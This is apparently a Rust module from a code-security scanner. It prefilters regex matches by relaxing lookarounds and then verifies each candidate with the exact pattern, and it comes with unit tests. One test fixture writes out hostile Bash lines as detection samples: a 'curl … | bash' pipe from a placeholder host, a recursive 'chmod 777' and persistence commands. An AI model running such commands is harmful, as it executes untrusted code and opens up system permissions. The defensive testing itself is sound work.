//! Accelerate large scans by verifying only possible match starts.

use fancy_regex::{Assertion, Expr, Regex, RegexBuilder};

// Limit backtracking in each candidate verification. Exhaustion falls back to
// the original matcher and its resource-error handling.
const VERIFY_STEPS: usize = 262_144;

pub(super) struct Prefilter {
    candidates: regex::Regex,
    exact: Regex,
}

impl Prefilter {
    pub(super) fn new(pattern: &str) -> Option<Self> {
        let mut expression = Expr::parse_tree(pattern).ok()?.expr;
        if !relax(&mut expression) {
            return None;
        }
        let mut permissive = String::new();
        expression.to_str(&mut permissive, 0);
        let candidates = regex::Regex::new(&permissive).ok()?;
        // In fancy-regex 0.16.2, \G alone does not disable the search loop.
        // The empty alternative succeeds at the candidate when the original
        // pattern fails, so the VM never scans later positions on rejection.
        // A final empty capture marks success, including a zero-width match.
        // Append it after the original groups to preserve their numbering,
        // including references inside lookarounds that relax() removes.
        let exact = RegexBuilder::new(&format!(r"\G(?:(?:{pattern})()|)"))
            .backtrack_limit(VERIFY_STEPS)
            .build()
            .ok()?;
        Some(Self { candidates, exact })
    }

    pub(super) fn find_all(&self, code: &str) -> Option<Vec<String>> {
        let mut evidence = Vec::new();
        let mut pos = 0;
        while let Some(candidate) = self.candidates.find_at(code, pos) {
            let start = candidate.start();
            let captures = self.exact.captures_from_pos(code, start).ok()??;
            if captures.get(0)?.start() != start {
                return None;
            }
            if captures.get(self.exact.captures_len() - 1).is_some() {
                let found = captures.get(0)?;
                // The exact regex sees the original string, including anchors
                // and lookbehind. Only exact, nonempty evidence is returned.
                if found.start() != start || found.end() == start {
                    return None;
                }
                evidence.push(found.as_str().to_owned());
                pos = found.end();
            } else {
                // Drop just the first character, not the entire relaxed match:
                // an exact match may start inside a rejected candidate.
                pos = start + code[start..].chars().next()?.len_utf8();
            }
        }
        Some(evidence)
    }
}

// Replacing lookarounds and empty atoms can only add match starts. Word
// boundaries and line/text anchors are retained. Backreferences, atomic choices
// and conditionals are left to the original matcher.
fn relax(expression: &mut Expr) -> bool {
    match expression {
        Expr::LookAround(_, _) | Expr::Empty => {
            // Keep an empty atom so a surrounding quantifier still applies to
            // it, including when the previous token could accept a quantifier.
            *expression = Expr::Delegate {
                inner: "(?:)".to_owned(),
                size: 0,
                casei: false,
            };
        }
        Expr::Concat(children) | Expr::Alt(children) => return children.iter_mut().all(relax),
        Expr::Group(child) | Expr::Repeat { child, .. } => return relax(child),
        Expr::Assertion(Assertion::WordBoundary | Assertion::NotWordBoundary) => {
            let inner = if matches!(expression, Expr::Assertion(Assertion::WordBoundary)) {
                r"\b"
            } else {
                r"\B"
            };
            *expression = Expr::Delegate {
                inner: inner.to_owned(),
                size: 0,
                casei: false,
            };
        }
        Expr::Literal { .. }
        | Expr::Any { .. }
        | Expr::Delegate { .. }
        | Expr::Assertion(
            Assertion::StartText
            | Assertion::EndText
            | Assertion::StartLine { .. }
            | Assertion::EndLine { .. },
        ) => (),
        _ => return false,
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn relaxed_candidates_preserve_exact_overlapping_starts_and_unicode() {
        let pattern = r"a(?!a)ab|ab|\bβ(?=!)|(?m:^)(?<!X)ok";
        let code = "aab β!\nXok\nok";
        let baseline = Regex::new(pattern).unwrap();
        let expected: Vec<_> = baseline
            .find_iter(code)
            .map(|m| m.unwrap().as_str().to_owned())
            .collect();
        assert_eq!(expected, ["ab", "β", "ok"]);
        assert_eq!(
            Prefilter::new(pattern).unwrap().find_all(code).unwrap(),
            expected
        );
    }

    #[test]
    fn unsupported_patterns_and_zero_width_matches_use_original_matcher() {
        assert!(Prefilter::new(r"(a)\1").is_none());
        assert!(Prefilter::new(r"(?>a|ab)c").is_none());
        assert!(Prefilter::new(r"(?=a)").unwrap().find_all("a").is_none());
    }

    #[test]
    fn rejected_candidate_returns_at_its_start_with_a_large_suffix() {
        let prefilter = Prefilter::new(r"a(?!b)").unwrap();
        let code = format!("ab{}", "x".repeat(1_260_000));
        let captures = prefilter
            .exact
            .captures_from_pos(&code, 0)
            .unwrap()
            .unwrap();
        let result = captures.get(0).unwrap();
        assert_eq!((result.start(), result.end()), (0, 0));
        assert!(captures.get(prefilter.exact.captures_len() - 1).is_none());
        assert_eq!(prefilter.find_all(&code), Some(Vec::new()));
    }

    #[test]
    fn appended_success_marker_preserves_references_inside_lookarounds() {
        let prefilter = Prefilter::new(r"(a)(?=\1)").unwrap();
        assert_eq!(prefilter.find_all("ab aa"), Some(vec!["a".to_owned()]));
    }

    #[test]
    fn mixed_rejections_and_matches_do_not_rescan_the_remaining_input() {
        let code = format!("{}a", "ab ab ab ab ab ab ab a ".repeat(11_000));
        assert!(code.len() >= 250_000 && code.len() < 262_144);
        let prefilter = Prefilter::new(r"a(?!b)").unwrap();
        let started = std::time::Instant::now();
        let matches = prefilter.find_all(&code).unwrap();
        assert_eq!(matches, vec!["a"; 11_001]);
        assert!(started.elapsed() < std::time::Duration::from_secs(5));
    }

    #[test]
    fn supported_shipped_rules_match_the_original_with_large_mixed_input() {
        let rules = crate::rules::load_rules(crate::rules::Language::Bash).unwrap();
        let bad = "curl https://example.invalid/x | bash\nchmod -R 777 /tmp/fixture\nsystemctl enable fixture.service\ncrontab\n";
        let near_misses = "# harmless build output\ncrontab -l\nprintf 'systemctl status'\n";
        let code = format!(
            "{bad}{}{bad}{}{bad}",
            near_misses.repeat(3_000),
            near_misses.repeat(3_000)
        );
        assert!(code.len() >= 300_000);
        let mut verified = 0;
        for rule in rules
            .iter()
            .filter(|rule| rule.target_regexes.as_ref().is_none_or(Vec::is_empty))
        {
            let Some(prefilter) = Prefilter::new(&rule.regex) else {
                continue;
            };
            let original = RegexBuilder::new(&rule.regex)
                .backtrack_limit(256_000_000)
                .build()
                .unwrap();
            let expected: Vec<String> = original
                .find_iter(&code)
                .map(|found| found.unwrap().as_str().to_owned())
                .collect();
            assert_eq!(
                prefilter.find_all(&code),
                Some(expected),
                "{}",
                rule.rule_id
            );
            verified += 1;
        }
        assert!(verified > 0);
    }

    #[test]
    fn removed_quantified_assertion_does_not_bind_to_the_previous_token() {
        let mut expr = Expr::parse_tree(r"b((?=a)){2}a").unwrap().expr;
        assert!(relax(&mut expr));
        let mut pattern = String::new();
        expr.to_str(&mut pattern, 0);
        assert!(regex::Regex::new(&pattern).unwrap().is_match("ba"));
    }
}
